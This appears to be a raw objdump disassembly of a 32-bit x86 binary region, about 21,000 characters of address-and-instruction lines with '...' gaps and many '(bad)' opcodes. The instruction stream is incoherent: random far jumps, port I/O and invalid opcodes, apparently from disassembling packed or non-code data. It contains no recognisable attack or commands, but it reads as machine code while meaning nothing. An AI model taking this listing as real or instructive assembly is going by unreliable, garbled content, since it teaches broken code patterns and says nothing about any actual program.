  41e72a:	clc    
  41e72b:	add    dh,BYTE PTR [edx]
  41e72d:	xor    esp,edi
  41e72f:	sahf   
  41e730:	rcr    BYTE PTR [ebx+eiz*4],1
  41e733:	stc    
  41e734:	xor    esi,ebp
  41e736:	icebp  
  41e737:	adc    al,0xb7
  41e739:	push   esi
  41e73a:	enter  0xed90,0x92
  41e73e:	dec    edi
  41e73f:	or     edx,DWORD PTR [edi+0x19c38eac]
  41e745:	mov    ebp,0x4715e80
  41e74a:	sti    
  41e74b:	push   0x2d
  41e74d:	out    dx,al
  41e74e:	pop    eax
  41e74f:	mov    ah,0x3d
  41e751:	inc    eax
  41e752:	sub    al,0x25
  41e754:	inc    edx
  41e755:	cs xchg esi,eax
  41e757:	rcl    DWORD PTR [edx-0x62],1
  41e75a:	xchg   ecx,eax
  41e75b:	addr16 pop eax
  41e75d:	in     eax,dx
  41e75e:	sbb    dh,ch
  41e760:	repnz int 0xa0
  41e763:	aas    
  41e764:	aas    
  41e765:	xchg   edi,eax
  41e766:	xchg   edx,eax
  41e767:	jo     0x41e7ca
  41e769:	mov    WORD PTR [ebx],cs
  41e76b:	cmp    eax,0xc1acd843
  41e770:	xlat   BYTE PTR ds:[ebx]
  41e771:	xor    al,0xe3
  41e773:	add    dh,BYTE PTR [ecx+0x4e3107bf]
  41e779:	retf   0x2ae1
  41e77c:	jl     0x41e70e
  41e77e:	adc    eax,0xb71fc7c6
  41e783:	xchg   edi,eax
  41e784:	lea    ebp,[edi]
  41e786:	in     eax,dx
  41e787:	fcom   QWORD PTR [esi]
  41e789:	mov    eax,0x6edc6835
  41e78e:	push   edx
  41e78f:	shl    DWORD PTR [edx+0xd],1
  41e792:	mov    WORD PTR [eax-0x9],es
  41e795:	sbb    eax,DWORD PTR [edi+0x5e7d45f5]
  41e79b:	imul   ecx,DWORD PTR [eax],0x6defaad5
  41e7a1:	pop    esp
  41e7a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a3:	lds    ecx,FWORD PTR [eax]
  41e7a5:	or     BYTE PTR [edx+0x28b7b459],ch
  41e7ab:	dec    esp
  41e7ac:	mov    ecx,DWORD PTR [ebp-0x51]
  41e7af:	jmp    0xf24c03dc
  41e7b4:	mov    ebp,0xe71b56f3
  41e7b9:	rcl    DWORD PTR ds:0x9c9bc907,1
  41e7bf:	test   al,0xa3
  41e7c1:	sahf   
  41e7c2:	ficom  DWORD PTR [edi+0x7b]
  41e7c5:	sub    dl,BYTE PTR [ebp-0x45]
  41e7c8:	pop    es
  41e7c9:	dec    eax
  41e7ca:	or     DWORD PTR [ecx-0x7a],ebp
  41e7cd:	mov    bl,0x8c
  41e7cf:	add    eax,DWORD PTR [edi+0x73]
  41e7d2:	shl    BYTE PTR [eax-0x53],cl
  41e7d5:	adc    bh,BYTE PTR [eax-0x4ccab185]
  41e7db:	rol    BYTE PTR [edi+0x54],cl
  41e7de:	jmp    0x8bc19aa2
  41e7e3:	gs dec esp
  41e7e5:	jae    0x41e81f
  41e7e7:	fsub   QWORD PTR [eax-0x40]
  41e7ea:	shr    BYTE PTR [eax+eax*2+0x37],0xc8
  41e7ef:	or     ebx,esi
  41e7f1:	push   ebp
  41e7f2:	fist   WORD PTR [esi+0x51750a9]
  41e7f8:	outs   dx,BYTE PTR ds:[esi]
  41e7f9:	xchg   DWORD PTR [eax+0x3],edx
  41e7fc:	cwde   
  41e7fd:	ja     0x41e854
  41e7ff:	(bad)  
  41e800:	fs inc eax
  41e802:	inc    bh
  41e804:	(bad)  
  41e805:	stos   DWORD PTR es:[edi],eax
  41e806:	mov    DWORD PTR [edi],ebx
  41e808:	mov    al,ds:0xc13d94c6
  41e80d:	mov    ds:0xfe34ee,eax
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8ff
  41e881:	lods   al,BYTE PTR ds:[esi]
  41e882:	stos   BYTE PTR es:[edi],al
  41e883:	push   esi
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0x4000001,al
  41e88d:	push   ss
  41e88e:	loopne 0x41e8b8
  41e890:	adc    cl,al
  41e892:	jle    0x41e90b
  41e894:	fistp  WORD PTR [ecx+ecx*4]
  41e897:	outs   dx,BYTE PTR ds:[esi]
  41e898:	or     eax,0xe4018cee
  41e89d:	stc    
  41e89e:	pop    ss
  41e89f:	rol    ebp,1
  41e8a1:	std    
  41e8a2:	pop    es
  41e8a3:	retf   0xe3f3
  41e8a6:	int    0x4e
  41e8a8:	cli    
  41e8a9:	xchg   ebx,eax
  41e8aa:	mov    edx,0x876a0620
  41e8af:	adc    esi,esp
  41e8b1:	mov    dh,0xa8
  41e8b3:	or     al,0xdf
  41e8b5:	fisttp DWORD PTR [ebp+0x1442bae8]
  41e8bb:	int    0xe4
  41e8bd:	aaa    
  41e8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8bf:	jl     0x41e936
  41e8c1:	das    
  41e8c2:	sbb    DWORD PTR [ebx],0x23
  41e8c5:	cmp    BYTE PTR [esi+edx*4+0x29],dl
  41e8c9:	and    BYTE PTR [ebx+0x377efb61],0x28
  41e8d0:	arpl   WORD PTR [eax-0xc],di
  41e8d3:	pop    esi
  41e8d4:	xor    ecx,DWORD PTR [ecx+0x6f]
  41e8d7:	mov    ah,0xf8
  41e8d9:	push   edx
  41e8da:	fs aas 
  41e8dc:	pop    esp
  41e8dd:	cli    
  41e8de:	sbb    dh,BYTE PTR [ebp+0x5dbc4301]
  41e8e4:	xor    al,0x62
  41e8e6:	stos   DWORD PTR es:[edi],eax
  41e8e7:	push   edi
  41e8e8:	dec    ecx
  41e8e9:	nop
  41e8ea:	sbb    al,0x45
  41e8ec:	mov    eax,ds:0x7966401e
  41e8f1:	push   cs
  41e8f2:	dec    ebx
  41e8f3:	add    DWORD PTR [ecx],0x5923b9f8
  41e8f9:	mov    bl,0xb7
  41e8fb:	push   ss
  41e8fc:	test   bh,bl
  41e8fe:	int3   
  41e8ff:	mov    BYTE PTR [edi-0x2c],bh
  41e902:	or     BYTE PTR [edx+0x69b34626],ch
  41e908:	in     eax,dx
  41e909:	adc    al,0x3
  41e90b:	cld    
  41e90c:	jno    0x41e8a6
  41e90e:	xor    ecx,DWORD PTR ds:0x238dd926
  41e914:	inc    ebx
  41e915:	pop    ds
  41e916:	push   es
  41e917:	mov    ds:0x57e51d53,al
  41e91c:	mov    esp,0x38e15e3c
  41e921:	mov    eax,0xa052ac3d
  41e926:	jg     0x41e8d6
  41e928:	dec    edi
  41e929:	mov    DWORD PTR [eax+ebx*8+0x18],edx
  41e92d:	out    dx,eax
  41e92e:	jecxz  0x41e934
  41e930:	cmp    edi,esp
  41e932:	pop    ebx
  41e933:	sbb    eax,0x67b26d2d
  41e938:	lods   al,BYTE PTR ds:[esi]
  41e939:	mov    bl,0xd3
  41e93b:	and    BYTE PTR [edi],bh
  41e93d:	jae    0x41e8f1
  41e93f:	add    DWORD PTR gs:[ebp-0xe],esp
  41e943:	sbb    eax,0xf8d6a4b8
  41e948:	pop    ecx
  41e949:	inc    ecx
  41e94a:	jne    0x41e903
  41e94c:	scas   al,BYTE PTR es:[edi]
  41e94d:	xor    cl,bh
  41e94f:	mov    ds:0xb533d6ab,al
  41e954:	cvttps2pi mm1,xmm2
  41e957:	or     BYTE PTR [ebx-0x4f],0xdd
  41e95b:	pop    ds
  41e95c:	dec    esi
  41e95d:	rcl    edx,1
  41e95f:	fwait
  41e960:	add    esp,ebp
  41e962:	adc    BYTE PTR [ecx-0x64],cl
  41e965:	inc    ecx
  41e966:	mov    ah,0xd6
  41e968:	mov    DWORD PTR [esi-0x4a222a63],ebp
  41e96e:	test   BYTE PTR [ebp-0x2e131bab],dl
  41e974:	xchg   edx,eax
  41e975:	xchg   esi,eax
  41e976:	jns    0x41e990
  41e978:	cmp    al,0xb
  41e97a:	aam    0x4d
  41e97c:	push   0x272c3416
  41e981:	add    al,BYTE PTR [eax]
  41e983:	jbe    0x41e98a
  41e985:	add    ch,0xf7
  41e988:	inc    ebp
  41e989:	mov    ebx,0x661e8fd7
  41e98e:	and    esp,DWORD PTR [edx]
  41e990:	jmp    0x41e992
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	jnp    0x41ea63
  41ea02:	dec    sp
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xb7000001
  41ea0d:	mov    BYTE PTR [ebx+0x552949b4],bh
  41ea13:	inc    edx
  41ea14:	push   ebx
  41ea15:	shl    ebp,0x49
  41ea18:	ja     0x41ea34
  41ea1a:	test   BYTE PTR [edx],bl
  41ea1c:	push   0x11593027
  41ea21:	imul   edx,DWORD PTR [ebx-0x58317415],0xffffff87
  41ea28:	add    ebx,DWORD PTR [ebx]
  41ea2a:	test   BYTE PTR [edi+0x4a],0xa9
  41ea2e:	je     0x41ea0f
  41ea30:	push   cs
  41ea31:	(bad)  
  41ea32:	fldenv [ebp+0x59fd10c1]
  41ea38:	scas   eax,DWORD PTR es:[edi]
  41ea39:	(bad)  
  41ea3a:	ficom  DWORD PTR [ebx+0x2d1a5233]
  41ea40:	popa   
  41ea41:	sub    edx,DWORD PTR [edx-0x71febfcb]
  41ea47:	jg     0x41ea72
  41ea49:	pop    ds
  41ea4a:	mov    gs,esi
  41ea4c:	cdq    
  41ea4d:	xor    al,0x85
  41ea4f:	sbb    cl,al
  41ea51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea52:	test   eax,0x188a751d
  41ea57:	div    BYTE PTR [ebx+0x60]
  41ea5a:	retf   0xa3c8
  41ea5d:	adc    ah,BYTE PTR [edx]
  41ea5f:	scas   al,BYTE PTR es:[edi]
  41ea60:	or     al,0x75
  41ea62:	(bad)  
  41ea64:	ret    
  41ea65:	pusha  
  41ea66:	xor    ebx,DWORD PTR [eax+0x5c]
  41ea69:	dec    ebx
  41ea6a:	scas   eax,DWORD PTR es:[edi]
  41ea6b:	mov    dh,0x3e
  41ea6d:	int3   
  41ea6e:	repz call 0xaa52:0xdd76d315
  41ea76:	fist   DWORD PTR [edi]
  41ea78:	loop   0x41ea0d
  41ea7a:	and    BYTE PTR [edx],al
  41ea7c:	popa   
  41ea7d:	loopne 0x41eaef
  41ea7f:	mov    ds:0x504a770,al
  41ea84:	xchg   ecx,eax
  41ea85:	xor    eax,0x8c732853
  41ea8a:	cmp    ah,ch
  41ea8c:	cmp    BYTE PTR [esi],dh
  41ea8e:	cmp    DWORD PTR [ecx+edx*1+0x48],ebx
  41ea92:	lds    ecx,FWORD PTR [esi-0x64d710c6]
  41ea98:	inc    edi
  41ea99:	in     al,0xaa
  41ea9b:	imul   esi,DWORD PTR [bx+di-0x3ecf],0xffffffa4
  41eaa1:	cld    
  41eaa2:	xchg   ebx,eax
  41eaa3:	int3   
  41eaa4:	xor    ebx,DWORD PTR [esi-0xf]
  41eaa7:	and    bh,BYTE PTR [ecx+0x658047be]
  41eaad:	pop    ebp
  41eaae:	push   es
  41eaaf:	and    esi,0xc1c04146
  41eab5:	or     dl,dh
  41eab7:	cwde   
  41eab8:	and    ebp,esp
  41eaba:	(bad)  
  41eabb:	jmp    0x889c983c
  41eac0:	lds    ecx,FWORD PTR [eax-0x3b675227]
  41eac6:	fwait
  41eac7:	rol    BYTE PTR [ebx+0x48126753],cl
  41eacd:	adc    al,0xd4
  41eacf:	int    0xa6
  41ead1:	inc    edi
  41ead2:	mov    WORD PTR [edx-0x1b32f21b],es
  41ead8:	jno    0x41eaf4
  41eada:	xchg   esi,eax
  41eadb:	outs   dx,BYTE PTR ds:[esi]
  41eadc:	pop    ds
  41eadd:	mov    eax,ds:0x2d1a8eed
  41eae2:	fdivp  st(4),st
  41eae4:	and    ebx,DWORD PTR [edx]
  41eae6:	jle    0x41eb34
  41eae8:	inc    esi
  41eae9:	lea    edi,[ecx+0x7c]
  41eaec:	push   0x151ebb4f
  41eaf1:	xor    DWORD PTR [ebx+0x49],0xc48e5615
  41eaf8:	or     ah,al
  41eafa:	ja     0x41eb03
  41eafc:	xor    eax,0x4e9f46c9
  41eb01:	fnsave [edx+0x79564260]
  41eb07:	cmp    BYTE PTR [esi],ch
  41eb09:	add    DWORD PTR [ebx+0x4bc7c77f],ecx
  41eb0f:	push   edi
  41eb10:	dec    edx
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x48
  41eb81:	dec    esp
  41eb82:	push   esi
  41eb83:	jno    0x41eba0
  41eb85:	inc    edi
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0xd4000001
  41eb8d:	cmp    BYTE PTR [esi+0x37],ah
  41eb90:	mov    bh,ah
  41eb92:	push   cs
  41eb93:	pop    ds
  41eb94:	jne    0x41eba6
  41eb96:	mov    edx,DWORD PTR [edx-0x3d]
  41eb99:	lock clc 
  41eb9b:	es pusha 
  41eb9d:	lds    edi,FWORD PTR ds:0x9b8a8ace
  41eba3:	repz faddp st(1),st
  41eba6:	mov    dl,0x65
  41eba8:	sar    DWORD PTR [ebp-0x66],0xee
  41ebac:	imul   ecx,DWORD PTR [edi],0xd2d02cb1
  41ebb2:	and    DWORD PTR [edx+0x7b],eax
  41ebb5:	and    ch,al
  41ebb7:	dec    ebp
  41ebb8:	mov    dl,0xae
  41ebba:	rcr    ebp,0xc5
  41ebbd:	xchg   ebp,eax
  41ebbe:	mov    al,ds:0x87cd493
  41ebc3:	pop    edx
  41ebc4:	test   DWORD PTR [ebp+0x24],ebp
  41ebc7:	sub    eax,DWORD PTR [ebx-0x629b3a45]
  41ebcd:	sar    DWORD PTR [edi-0x1126685e],cl
  41ebd3:	or     BYTE PTR [ebp-0x5e],0xf9
  41ebd7:	test   al,0xdc
  41ebd9:	cmp    BYTE PTR [esi],ch
  41ebdb:	sti    
  41ebdc:	cli    
  41ebdd:	mov    edx,0xad1a9dd1
  41ebe2:	jecxz  0x41ec4e
  41ebe4:	or     DWORD PTR [ecx],0x830e20a0
  41ebea:	xchg   ecx,eax
  41ebeb:	dec    edi
  41ebec:	fistp  QWORD PTR [ebp+esi*4-0x17158997]
  41ebf3:	mov    esi,0x4bf216e6
  41ebf8:	push   ecx
  41ebf9:	xchg   esp,eax
  41ebfa:	jp     0x41eb94
  41ebfc:	stc    
  41ebfd:	jnp    0x41ec0c
  41ebff:	xor    al,BYTE PTR [ecx-0x23e3d2e9]
  41ec05:	pushf  
  41ec06:	adc    eax,DWORD PTR [edi]
  41ec08:	popa   
  41ec09:	add    cl,bl
  41ec0b:	sahf   
  41ec0c:	pop    eax
  41ec0d:	les    edi,FWORD PTR [ebx]
  41ec0f:	(bad)  
  41ec10:	xchg   ebp,eax
  41ec11:	stos   BYTE PTR es:[edi],al
  41ec12:	push   cs
  41ec13:	cmp    esp,DWORD PTR [ebx-0x2b88ba24]
  41ec19:	and    cl,ch
  41ec1b:	retf   0xd00a
  41ec1e:	mov    ds:0x49637872,eax
  41ec23:	mov    cl,0x9f
  41ec25:	mov    edi,DWORD PTR [edi]
  41ec27:	xchg   BYTE PTR [edx],ah
  41ec29:	jecxz  0x41ec68
  41ec2b:	daa    
  41ec2c:	imul   edi,DWORD PTR [edi+0x3e19e389],0x17
  41ec33:	idiv   cl
  41ec35:	out    dx,eax
  41ec36:	aas    
  41ec37:	(bad)  
  41ec38:	addr16 dec ecx
  41ec3a:	ds pop ds
  41ec3c:	add    al,bh
  41ec3e:	aam    0xb7
  41ec40:	jl     0x41ec70
  41ec42:	add    al,0xc0
  41ec44:	(bad)  
  41ec46:	dec    edi
  41ec47:	(bad)  
  41ec48:	in     al,dx
  41ec49:	mov    eax,ds:0x190a397c
  41ec4e:	sub    ah,bh
  41ec50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec51:	in     eax,dx
  41ec52:	sti    
  41ec53:	jp     0x41ec1a
  41ec55:	test   BYTE PTR [eax-0x39],0x60
  41ec59:	fistp  QWORD PTR [ebp+0x15]
  41ec5c:	jmp    0x56bce4b2
  41ec61:	out    0x46,eax
  41ec63:	fcmove st,st(0)
  41ec65:	(bad)  
  41ec66:	push   esi
  41ec67:	dec    edx
  41ec68:	mov    al,ds:0x42ab649a
  41ec6d:	popf   
  41ec6e:	adc    eax,0xaeccff3c
  41ec73:	sbb    al,0x6a
  41ec75:	fidiv  WORD PTR [esi]
  41ec77:	xchg   edx,eax
  41ec78:	out    0x55,al
  41ec7a:	jge    0x41ec3d
  41ec7c:	and    ecx,DWORD PTR [eax+0x2b]
  41ec7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec80:	or     al,BYTE PTR [esi+eax*2-0xd819395]
  41ec87:	cld    
  41ec88:	or     DWORD PTR [ebx],esp
  41ec8a:	fiadd  WORD PTR [ecx+0x459f019a]
  41ec90:	out    dx,eax
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x1c755fd0
  41ed02:	cli    
  41ed03:	and    BYTE PTR [bx+si+0x1],cl
  41ed07:	add    BYTE PTR ds:0xa7000001,al
  41ed0d:	cli    
  41ed0e:	fist   DWORD PTR [esi-0x1253c29f]
  41ed14:	clc    
  41ed15:	gs mov al,0xbc
  41ed18:	cmp    DWORD PTR ds:0x869ecbd6,ecx
  41ed1e:	lock shr DWORD PTR [edi],cl
  41ed21:	sub    eax,0xdcde6893
  41ed26:	push   esp
  41ed27:	and    DWORD PTR [edx-0x36fef419],eax
  41ed2d:	mulps  xmm4,XMMWORD PTR [edi]
  41ed30:	add    al,0x2f
  41ed32:	add    BYTE PTR [esp+ecx*2-0x26],0xc7
  41ed37:	or     edi,DWORD PTR [esi]
  41ed39:	pop    ebp
  41ed3a:	jb     0x41ece4
  41ed3c:	rol    BYTE PTR [edi+0xf],cl
  41ed3f:	adc    al,0x5c
  41ed41:	fwait
  41ed42:	push   cs
  41ed43:	dec    ebp
  41ed44:	xchg   esi,eax
  41ed45:	gs ds retw 
  41ed49:	not    BYTE PTR [edx-0x29b903e3]
  41ed4f:	leave  
  41ed50:	ins    BYTE PTR es:[edi],dx
  41ed51:	push   cs
  41ed52:	push   esp
  41ed53:	int    0xc8
  41ed55:	add    al,cl
  41ed57:	js     0x41ed2c
  41ed59:	(bad)  
  41ed5a:	jb     0x41ed3a
  41ed5c:	adc    edx,DWORD PTR [eax]
  41ed5e:	xchg   ecx,eax
  41ed5f:	sub    bh,dl
  41ed61:	push   ss
  41ed62:	xlat   BYTE PTR ds:[ebx]
  41ed63:	les    edx,FWORD PTR [ecx-0x3870b1cc]
  41ed69:	ss sbb cl,bl
  41ed6c:	lods   al,BYTE PTR ds:[esi]
  41ed6d:	xor    BYTE PTR [edx+0xb],dh
  41ed70:	pop    ecx
  41ed71:	and    bh,dl
  41ed73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed74:	jle    0x41ed89
  41ed76:	inc    eax
  41ed77:	mov    ?,WORD PTR [eax]
  41ed79:	xor    eax,0x735cde18
  41ed7e:	out    dx,eax
  41ed7f:	dec    esi
  41ed80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed81:	inc    ebx
  41ed82:	fwait
  41ed83:	mov    bl,0x99
  41ed85:	and    DWORD PTR [ebx-0x4f],0xffffffbe
  41ed89:	adc    BYTE PTR ds:[esi+0xc],cl
  41ed8d:	imul   eax,DWORD PTR [edx],0x4d71bbff
  41ed93:	mov    WORD PTR [esi+0x3d],ds
  41ed96:	jp     0x41ed96
  41ed98:	add    DWORD PTR [ebx],esi
  41ed9a:	mov    bh,0xd
  41ed9c:	loope  0x41edbc
  41ed9e:	ins    BYTE PTR es:[edi],dx
  41ed9f:	add    ebx,DWORD PTR [esi]
  41eda1:	sahf   
  41eda2:	les    eax,FWORD PTR [eax+0x23]
  41eda5:	in     al,dx
  41eda6:	into   
  41eda7:	cli    
  41eda8:	lods   al,BYTE PTR ds:[esi]
  41eda9:	fs mov ebx,0xb4e83b8
  41edaf:	xlat   BYTE PTR ds:[ebx]
  41edb0:	repz ja 0x947a871
  41edb7:	clc    
  41edb8:	xlat   BYTE PTR ds:[ebx]
  41edb9:	xchg   edx,eax
  41edba:	pop    ebx
  41edbb:	mov    DWORD PTR [ecx+0x1a320a90],edi
  41edc1:	and    ch,BYTE PTR [eax-0x688056f8]
  41edc7:	ins    BYTE PTR es:[edi],dx
  41edc8:	shr    DWORD PTR cs:[edi+edi*2-0x2b],1
  41edcd:	ds jns 0x41ee1b
  41edd0:	mov    ecx,0x6a954c46
  41edd5:	imul   edi,DWORD PTR [eax+0x5],0xffffffa7
  41edd9:	enter  0xc2df,0xd7
  41eddd:	aam    0x5f
  41eddf:	into   
  41ede0:	mov    al,ds:0x9ed2263b
  41ede5:	shl    DWORD PTR [esi],0xab
  41ede8:	ins    DWORD PTR es:[edi],dx
  41ede9:	ins    BYTE PTR es:[edi],dx
  41edea:	mov    edi,DWORD PTR [ebx]
  41edec:	std    
  41eded:	sahf   
  41edee:	cdq    
  41edef:	sub    al,0x84
  41edf1:	jg     0x41ee49
  41edf3:	mov    BYTE PTR [ebx+0x29],dl
  41edf6:	and    al,0xe5
  41edf8:	or     al,0xf2
  41edfa:	sub    eax,0x1f7f8dcc
  41edff:	popf   
  41ee00:	out    dx,al
  41ee01:	retf   
  41ee02:	xlat   BYTE PTR ds:[ebx]
  41ee03:	jp     0x41ee19
  41ee05:	mov    eax,ds:0x507b5749
  41ee0a:	dec    esi
  41ee0b:	retf   
  41ee0c:	mov    BYTE PTR [ebx+0x14],cl
  41ee0f:	mov    edi,0xf5
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25e9:0x15662be7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x61000001
  41ee8d:	sub    BYTE PTR [ecx+ebp*4],0x71
  41ee91:	sub    BYTE PTR [edx-0x69dc358b],bl
  41ee97:	xor    DWORD PTR [eax+edx*8],ebp
  41ee9a:	in     eax,0x5f
  41ee9c:	iret   
  41ee9d:	in     al,0xac
  41ee9f:	xor    BYTE PTR [edx-0x4140cd44],0xbf
  41eea6:	jle    0x41eeac
  41eea8:	in     al,dx
  41eea9:	cs inc edx
  41eeac:	rcl    edx,cl
  41eeae:	cli    
  41eeaf:	pop    ebp
  41eeb0:	inc    eax
  41eeb1:	push   ebp
  41eeb2:	xchg   BYTE PTR [ecx+0x7],ch
  41eeb5:	test   al,0x2a
  41eeb7:	mov    edi,0xb9ccf17
  41eebc:	js     0x41eec2
  41eebe:	stc    
  41eebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eec0:	or     ch,BYTE PTR [ecx+0x7893fcb4]
  41eec6:	sub    ebx,ebp
  41eec8:	add    al,0xdb
  41eeca:	repnz push ds
  41eecc:	pop    edx
  41eecd:	dec    esp
  41eece:	loope  0x41ee62
  41eed0:	test   al,0x21
  41eed3:	loopne 0x41ee6e
  41eed5:	and    bl,BYTE PTR [eax]
  41eed7:	ss loope 0x41eeae
  41eeda:	adc    BYTE PTR [ecx],0x98
  41eedd:	aas    
  41eede:	cmp    al,0xf9
  41eee0:	call   0x348187e2
  41eee5:	mov    ebp,0x23b45f56
  41eeea:	mov    cl,0x7d
  41eeec:	aam    0xbb
  41eeee:	inc    cl
  41eef0:	in     al,0x7b
  41eef2:	jns    0x41ef3c
  41eef4:	push   ebp
  41eef5:	mov    al,0x29
  41eef7:	xchg   edi,eax
  41eef8:	push   edx
  41eef9:	mov    ch,0xb6
  41eefb:	(bad)  
  41eefc:	jo     0x41eeea
  41eefe:	push   esp
  41eeff:	daa    
  41ef00:	cmp    al,0x8c
  41ef02:	out    dx,al
  41ef03:	in     eax,0x57
  41ef05:	into   
  41ef06:	mov    dl,0x44
  41ef08:	xchg   edx,eax
  41ef09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef0a:	retf   0xb34b
  41ef0d:	cmp    dh,bl
  41ef0f:	jp     0x41ef0d
  41ef11:	(bad)  [eax+edi*4+0x1c]
  41ef15:	repz neg DWORD PTR [edi]
  41ef18:	inc    edi
  41ef19:	mov    esp,0x6134fcfa
  41ef1e:	push   cs
  41ef1f:	lods   al,BYTE PTR ds:[esi]
  41ef20:	bound  eax,QWORD PTR [edx+0x567f2e79]
  41ef26:	daa    
  41ef27:	cmp    ah,BYTE PTR [ebx]
  41ef29:	xchg   ebx,eax
  41ef2a:	addr16 dec esi
  41ef2c:	fistp  DWORD PTR [edx]
  41ef2e:	int    0x8e
  41ef30:	or     dh,BYTE PTR [esp+ebp*8+0x17]
  41ef34:	cdq    
  41ef35:	mov    cl,0x59
  41ef37:	rcl    dl,0xc9
  41ef3a:	and    BYTE PTR [ecx+0x79],0x85
  41ef3e:	gs mov bl,0xfa
  41ef41:	xor    al,BYTE PTR [ecx+0x27]
  41ef44:	lea    ecx,ds:0x5a5298a4
  41ef4a:	dec    esp
  41ef4b:	sub    ecx,DWORD PTR [edi-0x39]
  41ef4e:	add    ah,bh
  41ef50:	mov    dh,0xe5
  41ef52:	dec    eax
  41ef53:	add    bh,dl
  41ef55:	or     dl,ch
  41ef57:	xchg   ebp,eax
  41ef58:	mov    cl,0xd1
  41ef5a:	pop    ebp
  41ef5b:	mov    ah,0xa9
  41ef5d:	retf   
  41ef5e:	xchg   BYTE PTR [ebp-0x7db0f14e],al
  41ef64:	rcr    DWORD PTR [ebx],0x9a
  41ef67:	adc    esp,DWORD PTR [eax]
  41ef69:	cli    
  41ef6a:	out    0xc2,al
  41ef6c:	xor    al,0xa8
  41ef6e:	mov    edi,0x56f0e25a
  41ef73:	retf   0xc131
  41ef76:	sub    al,0xb2
  41ef78:	push   ebx
  41ef79:	loop   0x41eff0
  41ef7b:	arpl   WORD PTR [ebx+ebp*8-0x969eae1],di
  41ef82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef83:	call   0x11e8b04d
  41ef88:	adc    al,0xf
  41ef8a:	push   cs
  41ef8b:	push   es
  41ef8c:	inc    esp
  41ef8d:	shl    DWORD PTR [edx+0xd977],cl
	...
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,DWORD PTR [edx-0x18],0xe
  41f003:	hlt    
  41f004:	sub    cl,BYTE PTR [edx+0x1]
  41f007:	add    BYTE PTR ds:0x56000001,al
  41f00d:	sbb    bl,BYTE PTR [esi-0x3045d36d]
  41f013:	in     eax,dx
  41f014:	lahf   
  41f015:	stos   DWORD PTR es:[edi],eax
  41f016:	mov    edi,0xd9395161
  41f01b:	cmc    
  41f01c:	sub    BYTE PTR [edx+0x35],dh
  41f01f:	std    
  41f020:	mov    WORD PTR [esp+edx*4+0x2c],?
  41f024:	(bad)  
  41f025:	cmp    ebx,edi
  41f027:	add    al,0x13
  41f029:	rcr    DWORD PTR [ecx+0x68],cl
  41f02c:	clc    
  41f02d:	or     BYTE PTR [edx+ecx*4],al
  41f030:	int    0x55
  41f032:	push   0xffffff9f
  41f034:	cmp    al,0xe3
  41f036:	gs clc 
  41f038:	shr    DWORD PTR ds:0x86022f3f,1
  41f03e:	sub    ebp,DWORD PTR [ebx-0x40]
  41f041:	cmp    al,0x3
  41f043:	xor    eax,DWORD PTR [ecx]
  41f045:	sub    edx,DWORD PTR [ecx]
  41f047:	inc    esi
  41f048:	rol    DWORD PTR [ecx],cl
  41f04a:	xor    DWORD PTR [edx],edi
  41f04c:	mov    bl,0x92
  41f04e:	mov    BYTE PTR [edi-0x6580347],ah
  41f054:	sbb    eax,0x20bed477
  41f059:	dec    ebx
  41f05a:	add    DWORD PTR [ebx-0x9],edx
  41f05d:	outs   dx,DWORD PTR ds:[esi]
  41f05e:	fidivr DWORD PTR [esi+0x45]
  41f061:	aas    
  41f062:	xor    BYTE PTR [eax+0x44],0xbf
  41f066:	enter  0x8afd,0xb5
  41f06a:	jge    0x41f064
  41f06c:	imul   DWORD PTR [ecx]
  41f06e:	shl    ecx,1
  41f070:	stos   DWORD PTR es:[edi],eax
  41f071:	xchg   BYTE PTR [ebx],ch
  41f073:	cmp    BYTE PTR [ebp-0x2a10756d],0x33
  41f07a:	enter  0x6701,0xed
  41f07e:	dec    ebx
  41f07f:	nop
  41f080:	sbb    eax,esp
  41f082:	xor    DWORD PTR [ebx+0x2534d76f],edi
  41f088:	pop    ss
  41f089:	cmp    cl,al
  41f08b:	jecxz  0x41f0b9
  41f08d:	shr    DWORD PTR [ebx-0x3e3577e9],0xef
  41f094:	dec    ecx
  41f095:	jb     0x41f02b
  41f097:	mov    eax,ds:0x1bf62e48
  41f09c:	xchg   ebp,eax
  41f09d:	add    dl,BYTE PTR [esi+0x62f17657]
  41f0a3:	mov    al,ds:0x4cfd3c0d
  41f0a8:	fstp   QWORD PTR [edi+eiz*2]
  41f0ab:	sub    al,0x6b
  41f0ad:	inc    ecx
